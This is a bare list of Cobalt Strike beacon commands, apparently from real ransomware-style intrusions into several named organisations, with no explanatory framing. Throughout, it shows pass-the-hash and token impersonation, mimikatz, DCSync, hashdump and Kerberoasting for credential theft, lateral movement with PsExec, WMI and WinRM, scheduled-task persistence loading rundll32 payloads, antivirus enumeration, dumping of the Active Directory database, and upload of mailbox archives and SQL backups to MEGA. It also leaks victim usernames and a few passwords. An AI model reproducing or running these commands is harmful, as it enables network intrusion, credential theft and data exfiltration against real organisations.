+beacon> pth REDACTED.COM\aandaservice REDACTED
+beacon> shell copy x64.dll \\192.168.100.227\C$\ProgramData\x64.dll
+beacon> pth REDACTED\aandaservice REDACTED
+beacon> shell SCHTASKS /Create /u KORBEL\daniel.harvey_adm /p REDACTED /tn "Microsoft autoupdate#98189" /tr "cmd.exe /c rundll32 c:\windows\system32\ds64gt.dll entryPoint" /sc onstart /RU SYSTEM
+beacon> mimikatz !lsadump::backupkeys /system:z1ad2.REDACTED.local /export
+beacon> shell ping -n 1  vcz1dc1
+beacon> shell PsExec64.exe \\10.10.0.38 -accepteula -s -d rundll32 C:\windows\temp\ccs.dll entryPoint
+beacon> desktop
+beacon> portscan itvm1 3389 none 1
+beacon> net domain_controllers
+beacon> shell rundll32 C:\Users\Dorinda.alredge\appdata\roaming\Adobe\cache.dll entryPoint
+beacon> shell dir C:\
+beacon> shell net use
+beacon> shell net use \\172.24.2.8\c$ "REDACTED" /user:GlobalTranz.local\joel.reed
+beacon> shell net use \\10.222.0.100\c$ "REDACTED" /user:GlobalTranz.local\joel.reed
+beacon> edr_query localhost x64
+beacon> powershell-import /home/trash/tools/Invoke-Kerberoast.ps1
+beacon> psinject 10292 x64 Invoke-Kerberoast -OutputFormat HashCat | fl
+beacon> whoami
+beacon> shell whoami
+beacon> execute-assembly /home/user/TOOLS/2/SharpShares.exe shares
+beacon> pth ".\Remote Support" aad3b435b51404eeaad3b435b51404ee:296c19b3d2cb8e8729e5fe27f6cf764a
+beacon> portscan 172.0.0.1/24 21,22,23,25,53,80,81,110,119,137,139,143,443,445,465,587,993,995,1080,1194,1433,3306,3389,5500,5800,5900-5906,8080,9001,9030,9050,9051,9090,9091,9100 icmp 1024
+beacon> portscan 172.0.0.1/24 445 icmp 1024
+beacon> shell ping  10.69.201.21
+beacon> shell ping -n 1 10.69.201.21
+beacon> portscan 10.69.201.21 445,443,5000 icmp 1024
+beacon> portscan 10.69.201.21 22 icmp 1024
+beacon> portscan 10.69.201.21 80 icmp 1024
+beacon> portscan 10.69.201.21 1-1000 icmp 1024
+beacon> portscan 10.69.201.21 1001-5000 icmp 1024
+beacon> portscan 10.69.201.21 5001-10000 icmp 1024
+beacon> shell nltest /dclist:
+beacon> shell net accounts
+beacon> net domain
+beacon> net domain_controllers
+beacon> shell nltest /dclist:REDACTED.com
+beacon> psinject 4540 x64 Invoke-ShareFinder
+beacon> portscan 10.69.0.35 445 none
+beacon> shell dir
+beacon> shell C:\hp\Updater.exe
+beacon> run C:\hp\Updater.exe
+beacon> execute C:\hp\Updater.exe
+beacon> pth pkgprod\linux REDACTED
+beacon> shell net user "Administrator" /dom
+beacon> pth .\Administrator REDACTED
+beacon> dcsync pkgprod.local
+beacon> pwd
+beacon> run AdFind.bat
+beacon> spawn https
+beacon> make_token JDOSSN\nddevbernst REDACTED
+beacon> shell dir \\10.28.92.108\C$
+beacon> make_token REDACTED.local\nmsapps REDACTED
+beacon> shell net use * \\10.5.68.221\C$
+beacon> shell net use * \\10.10.222.20\C$
+beacon> shell net use * \\10.5.68.99\C$
+beacon> shell net use * \\10.91.18.115\C$
+beacon> shell net use * \\10.5.68.119\C$
+beacon> shell net use * \\10.10.220.140\C$
+beacon> shell ping 10.10.220.140
+beacon> shell dir C:\
+beacon> portscan 10.10.30.57 3389
+beacon> jump psexec 10.10.30.57 pipe
+beacon> shell wmic /node:10.10.30.57 share get caption,name,path
+beacon> execute-assembly SharpSharesNG.exe shares 10.10.30.57
+beacon> shell wmic /node:10.10.30.57 OS get NAME
+beacon> portscan 192.168.16.0/24 23,22,80,1433,135,445,3389,5900
+beacon> portscan 192.168.16.0/24
+beacon> shell ping INTEG-DRBD-XP64
+beacon> shell ping INTEG-XP1
+beacon> shell adfind.exe -b DC=REDACTED,DC=com -f "(objectcategory=person)" > ad_users.txt
+beacon> shell adfind.exe -b DC=REDACTED -f "(objectcategory=person)" > ad_users.txt
+beacon> shell adfind.exe -b DC=eu,DC=REDACTED,DC=com -f "(objectcategory=person)" > ad_users.txt
+beacon> shell adfind.exe -b DC=eu,DC=REDACTED,DC=com -f "(objectcategory=person)" > ad_users.txt
+beacon> net domain
+beacon> ls \\admindc1\c$
+beacon> ls \\admindc2\c$
+beacon> ls \\admindc3\c$
+beacon> ls \\admindc4\c$
+beacon> ls \\admindc5\c$
+beacon> ls \\dhcp02\c$
+beacon> ls \\kms\c$
+beacon> ls \\hyperv24\c$
+beacon> shell net use * \\DCWAS08.REDACTED.com\C$ VantgagePoint /user:REDACTED\rockwell
+beacon> shell net localgroup "Administrators"
+beacon> shell net group "Domain admins" /dom
+beacon> shell net group "Enterprise Admins" /dom
+beacon> shell ping francedc1
+beacon> shell ping francedc1.REDACTED.local
+beacon> shell ipconfig /all
+beacon> spawn u7
+beacon> spawn u7
+beacon> spawn https
+beacon> shell ping LRHVCENTER
+beacon> shell dir \\10.5.50.15\C$
+beacon> shell dir \\10.5.50.2\C$
+beacon> shell ping NSTORE0.REDACTED.mig
+beacon> shell dir \\192.168.254.110\C$
+beacon> jump winrm 192.168.254.110 pipe
+beacon> jump winrm 192.168.254.110 https
+beacon> jump psexec 192.168.254.110 https
+beacon> jump psexec 192.168.254.110 pipe
+beacon> hashdump
+beacon> logonpasswords
+beacon> shell net localgroup "Administrators"
+beacon> shell ping -n 1 CLEBACKUP.REDACTED.com
+beacon> portscan 192.168.0.105 445,21,22,3389,443
+beacon> portscan 10.225.10.200 445 icmp 1024
+beacon> shell nslookup 10.225.10.200
+beacon> shell ping datacenter.local
+beacon> shell ping 10.225.10.200
+beacon> shell wmic /node:192.168.110.198 logicaldisk get caption /user:dom.REDACTED.com\abunag /password:REDACTED
+beacon> shell net use
+beacon> shell wmic /node:loomiswebsrv4 logicaldisk get caption
+beacon> shell wmic /node:loomisgw2 logicaldisk get caption
+beacon> jump psexec 10.10.10.5 pipe
+beacon> jump psexec loomiswebsrv4 pipe
+beacon> jump psexec_psh loomisgw2.REDACTED.com https
+beacon> jump psexec_psh TLCWEBT1.REDACTED.com https
+beacon> jump psexec_psh loomiswebsrv4.REDACTED.com https
+beacon> shell def.bat
+beacon> jump psexec_psh TLCBENTS02.REDACTED.com https
+beacon> jump psexec_psh TLCBENTS01.REDACTED.com https
+beacon> jump psexec_psh TLCRDSLIC1.REDACTED.com https
+beacon> jump psexec_psh TLCEPICTS02.REDACTED.com https
+beacon> jump psexec_psh TLCEPICTS01.REDACTED.com https
+beacon> shell ping -n 10.10.1.24
+beacon> shell net use
+beacon> ls \\10.10.1.181\c$
+beacon> psinject 13584 x86 Get-DomainUser -Server 10.50.212.45 | out-file -filepath "C:\ProgramData\ad_users.txt"
+beacon> run AdFind.bat
+beacon> shell AdFind.bat
+beacon> shell dir
+beacon> net domain
+beacon> shell ping -a 127.0.1.1
+beacon> shell nslookup 127.0.1.1
+beacon> shell ping REDACTED.com
+beacon> portscan 72.52.147.20 1-30,135,139,443,445
+beacon> shell net accounts /dom
+beacon> shell net group "domain admins" /dom
+beacon> shell ping -n 1 192.168.0.192
+beacon> portscan PDITESTSQL.REDACTED.com
+beacon> portscan reporting.REDACTED.com
+beacon> portscan WWSQL2Old.REDACTED.com
+beacon> portscan wwsql02.REDACTED.com
+beacon> help rportfwd
+beacon> ls E:\Backups\REDACTED
+beacon> ls E:\Backups\REDACTED
+beacon> shell ping -n 1 10.89.11.40
+beacon> shell net localgroup administrators
+beacon> shell net group "Domain admins" /dom
+beacon> shell net group "Enterprise admins" /dom
+beacon> shell ping 172.16.1.247 -n 1
+beacon> shell ping 172.16.1.83 -n 1
+beacon> shell ping 172.16.1.61 -n 1
+beacon> shell ping BOBXPS.REDACTED.com
+beacon> shell ping REDACTED.REDACTED.com
+beacon> shell dir \\192.168.90.3\D$
+beacon> shell dir \\192.168.0.18\C$
+beacon> shell wmic /node:192.168.90.3 logicaldisk get description,name
+beacon> shell wmic /node:192.168.0.18 logicaldisk get description,name
+beacon> execute-assembly /home/user/Desktop/cobalt/Signature_Tools/exec-ass/SharpSniper.exe Bob Administrator REDACTED
+beacon> shell ping -a -n 1 127.0.1.1
+beacon> shell ping -a 192.168.0.75
+beacon> shell start /b MEGAcmdServer.exe
+beacon> shell MEGAclient.exe update --auto=off
+beacon> shell MEGAclient.exe login REDACTED@upived.online REDACTED
+beacon> shell MEGAclient.exe whoami
+beacon> shell MEGAclient.exe put -q --ignore-quota-warn "C:\Users\Djarden\Documents\Outlook Files\ol.7z"
+beacon> shell net use \\FAMIXXP\c$ rbuilder /user:REDACTED.com\REPORT_BUILDER
+beacon> shell net group "enterprise admins" /dom
+beacon> shell net group "domain admins" /dom
+beacon> execute-assembly /home/user/Desktop/cobalt/Tools/Ghostpack-CompiledBinaries-master/Rubeus.exe kerberoast /ldapfilter:'admincount=1' /format:hashcat /outfile:C:\Users\raja-9298\EULA_ha.txt
+beacon> portscan 10.59.8.0/24 23,22,80,1433,135,445,3389,5900`
+beacon> shell net group "domain admins" /dom
+beacon> portscan 192.168.237.0/24 23,22,80,1433,135,445,3389,5900`
+beacon> portscan 172.21.182.0/24`
+beacon> execute-assembly /home/user/tools/Net-GPPPassword.exe
+beacon> shell net group "domain admins" /dom
+beacon> shell net group "enterprise admins" /dom
+beacon> shell net localgroup "Administrators"
+beacon> shell nslookup
+beacon> shell net user ES050616C /dom
+beacon> shell net user ES050616C /dom
+beacon> net share
+beacon> net logons
+beacon> net domain
+beacon> net domain_controllers
+beacon> shell net use
+beacon> shell WMIC /Node:192.168.4.28 /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List
+beacon> shell WMIC /Node:192.168.1.235 /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List
+beacon> runas /user:REDACTED.com\Shutdown REDACTED "cmd /c rundll32 C:\Windows\temp\vmware-temp\AgentNT.dll entryPoint"
+beacon> shell WMIC /Node:192.168.6.34 /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List
+beacon> shell WMIC /Node:192.168.0.107 /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List
+beacon> shell WMIC /Node:10.10.10.56 /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List
+beacon> shell wmic /node:Metafile-vm1.REDACTED.com process call create "netstat.exe -abno > C:\Windows\Temp\output.txt"
+beacon> shell wmic /node:10.10.10.56 process call create "netstat.exe -abno > C:\Windows\Temp\output.txt"
+beacon> shell rundll32 C:\Windows\temp\vmware-temp\AgentNT.dll entryPoint
+beacon> shell schtasks /create /ru REDACTED.com\Omiller /tn ManagementAgentNTT /tr "rundll32 C:\Windows\temp\vmware-temp\AgentNT.dll entryPoint" /sc ONCE  /sd 10/04/2021 /ST 01:00 /f
+beacon> shell schtasks /run /tn ManagementAgentNTT
+beacon> make_token
+beacon> shell schtasks /create /s SCANSTORAGE /u REDACTED.com\Shutdown /p REDACTED /tn ManagementAgentNTT /tr "rundll32 C:\Windows\temp\vmware-temp\AgentNT.dll entryPoint" /sc minute
+beacon> spawnas REDACTED.com\Shutdown REDACTED 3333
+beacon> spawnas REDACTED.com\EDIADMIN APPSYS https
+beacon> portscan 192.168.3.0/24 445 icmp 1024
+beacon> shell ping PDFStorage.REDACTED.com
+beacon> sleep 3
+beacon> shell ping TLCSophos.REDACTED.com
+beacon> sleep 3
+beacon> shell ping TLCBENTS02.REDACTED.com
+beacon> shell ping TLCBENTS01.REDACTED.com
+beacon> shell pgo.bat
+beacon> shell pingtimeout.bat
+beacon> sleep 100
+beacon> shell MEGAclient.exe put -q --ignore-quota-warn F:\SQLBackup\*.bak
+beacon> shell MEGAclient.exe put -q --ignore-quota-warn \\wwsql2\F$\SQLBackup\*.bak
+beacon> shell dir F:\SQLBackup
+beacon> run ntdsutil "ac in ntds" "ifm" "cr fu c:\windows\temp\abcd" q q
+beacon> shell tasklist /s 10.225.10.215 /v
+beacon> shell tasklist /s 10.195.23.13 /v
+beacon> shell tasklist /s 10.195.23.14 /v
+beacon> shell nltest /dclist:REDACTED.com
+beacon> shell nltest /dclist:
+beacon> run net use * "\\192.168.168.10\Shares" /persistent:no /user:PKGPROD\jess REDACTED
+beacon> make_token saig.REDACTED.global\adm.soucam1 REDACTED
+beacon> shell tasklist /s 10.195.23.14 /v
+beacon> shell net use X: \\10.195.113.12\C$\temp /user:c360.local\adm.ravven0 REDACTED
+beacon> shell tasklist /s 10.195.13.14 /v /u c360.local\adm.ravven0 /p REDACTED
+beacon> portscan 10.195.13.14 445,139 icmp 1024
+beacon> shell net user adm.ji0lei0 /dom
+beacon> shell dir \\10.195.13.14\c$
+beacon> shell tasklist /s 10.225.10.215 /v
+beacon> elevate svc-exe
+beacon> shell ping -n 1 REDACTED.global
+beacon> shell ping REDACTED.global
+beacon> shell dir \\10.225.10.201\c$
+beacon> shell dir \\datacenter.local\c$
+beacon> jump psexec_psh datacenter.local https
+beacon> jump psexec64 datacenter.local https
+beacon> jump psexec_psh datacenter.local https
+beacon> pth datacenter.local\adm.barsmr0 REDACTED
+beacon> jump psexec_psh datacenter.local https
+beacon> rev2self
+beacon> pth datacenter.local\adm.taydav1  REDACTED
+beacon> jump psexec_psh USHDC1-REDACTED https
+beacon> shell adfind.exe -b dc=c360,dc=local -f "(objectcategory=person)" > C:\Windows\temp\Eula_c360.txt
+beacon> shell net localgroup "administrators"
+beacon> shell net use \\datacenter.local\c$ REDACTED /user:datacenter.local\adm.turime0
+beacon> make_token saig.REDACTED.global\adm.turime0 REDACTED
+beacon> rev2self
+beacon> make_token saig.REDACTED.global\adm.turime0 REDACTED
+beacon> jump psexec_psh USHDC1-REDACTED https
+beacon> net domain_trusts
+beacon> net domain
+beacon> shell nslookup 80-20 80-20.com
+beacon> portscan 80-20 80-20.com 445 icmp 1024
+beacon> shell ping 80-20 80-20.com -n 1
+beacon> shell ping LEADERS leaders.REDACTED.global -n 1
+beacon> portscan 10.225.10.201 445
+beacon> make_token saig.REDACTED.global\Americadpm REDACTED
+beacon> shell copy x64.dll \\10.225.10.201\C$\windows\Temp\
+beacon> psinject 760 x64 Invoke-Kerberoast -outputformat hashcat | fl | out-file -filepath C:\Windows\Temp\Eula.txt -append -force -encoding UTF8
+beacon> make_token saig.REDACTED.global\Americadpm REDACTED
+beacon> shell copy x64.dll \\10.212.8.247\C$\ProgramData
+beacon> shell wmic /node:10.212.8.247 process call create "rundll32 C:\ProgramData\x64.dll entryPoint"
+beacon> shell copy x64.dll \\datacenter.local\C$\windows\Temp\
+beacon> shell copy C:\ProgramData\x64.dll \\datacenter.local\C$\windows\Temp\
+beacon> make_token saig.REDACTED.global\sqladmin u5t3r
+beacon> upload /home/user/Desktop/cobalt/dll_maker/x64.dll
+beacon> shell copy x64.dll \\datacenter.local\C$\windows
+beacon> psinject 440 x64 Invoke-Kerberoast Invoke-Kerberoast -OutputFormat HashCat -Domain legalco.local | fl
+beacon> psinject 440 x64 Invoke-Kerberoast -OutputFormat HashCat -Domain datacenter.local | fl
+beacon> psinject 440 x64 Invoke-Kerberoast -OutputFormat HashCat -Domain datacenter.local | fl
+beacon> shell net user adm.kinzac0 /domain /active:yes
+beacon> shell net user adm.kinzac0 /dom
+beacon> run ping ad-apse2.prd.aws.saig
+beacon> run ping Anstat.local
+beacon> remote-exec psexec 10.10.20.131 C:\starter.exe
+beacon> shell net use
+beacon> portscan 10.0.20.222 3389 none
+beacon> shell c:\explorer.exe
+beacon> shell WINDOWSSystem32.exe
+beacon> pwd
+beacon> whoami
+beacon> shell whoami
+beacon> shell dir 1.exe
+beacon> shell 1.exe
+beacon> shell PsExec \\10.0.20.222 -d -s -h gpupdate /force -accepteula -y -u itc.local\egl_admin -p REDACTED
+beacon> shell PsExec \\* -d -s -h gpupdate /force -accepteula -y -u itc.local\egl_admin -p REDACTED
+beacon> shell net use
+beacon> shell ping polyrey.com
+beacon> shell ping resopal.ger
+beacon> shell dir \\172.22.198.11\C$
+beacon> shell net group administrators
+beacon> shell echo 1 > C:\readme.txt
+beacon> shell dir C:\readme.txt
+beacon> shell type C:\readme.txt
+beacon> upload /home/wevvewe/Desktop/readme.txt
+beacon> shell dir readme.txt
+beacon> pwd
+beacon> upload /home/wevvewe/Desktop/readme.txt
+beacon> shell dir readme.txt
+beacon> ls C:\
+beacon> shell dir C:\readme.txt
+beacon> shell type C:\readme.txt
+beacon> inject 1108 x64 https
+beacon> elevate svc-exe
+beacon> net domain
+beacon> hashdump
+beacon> logonpasswords
+beacon> jobs
+beacon> shell copy x64.dll \\139.62.66.77\C$\ProgramData
+beacon> shell dir
+beacon> ls C:\Users\cmelliott\AppData\Local\Microsoft\Edge
+beacon> audit_uac
+beacon> shell gpupdate
+beacon> shell net group "domain admins" /dom
+beacon> execute-assembly /home/user/Desktop/cobalt/Tools/Net-GPPPassword.exe
+beacon> execute-assembly /home/user/Desktop/cobalt/Tools/Net-GPPPassword.exe
+beacon> execute-assembly SharpView.exe Get-Domain
+beacon> shell net localgroup administrators
+beacon> shell net group "Domain admins" /dom
+beacon> shell net group "Enterprise admins" /dom
+beacon> shell nslookup matchesfashion.com
+beacon> shell arp -a
+beacon> shell type setting.ini
+beacon> shell route print -4
+beacon> shell net share
